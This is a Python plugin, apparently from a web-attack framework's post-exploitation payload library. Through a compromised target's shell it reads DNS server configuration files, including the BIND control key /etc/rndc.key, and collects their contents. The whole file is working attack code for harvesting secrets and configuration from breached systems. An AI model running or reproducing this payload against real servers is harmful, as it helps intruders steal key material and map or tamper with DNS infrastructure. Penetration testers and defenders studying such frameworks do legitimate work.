import re
from plugins.attack.payloads.base_payload import base_payload

class dns_config_files(base_payload):
    '''
    This payload shows DNS Server configuration files
    '''
    def api_read(self):
        result = []
        files = []

        files.append('/etc/named.conf')
        files.append('/etc/bind/named.conf.local')
        files.append('/etc/bind/named.conf')
        files.append('/var/named/named.conf')
        files.append('/var/named/private.rev')
        files.append('/etc/bind/named.conf.options')
        files.append('/etc/resolv.conf')
        files.append('/etc/rndc.conf ')
        files.append('/etc/rndc.key')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result
        
    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('DNS configuration files not found.')
        return result
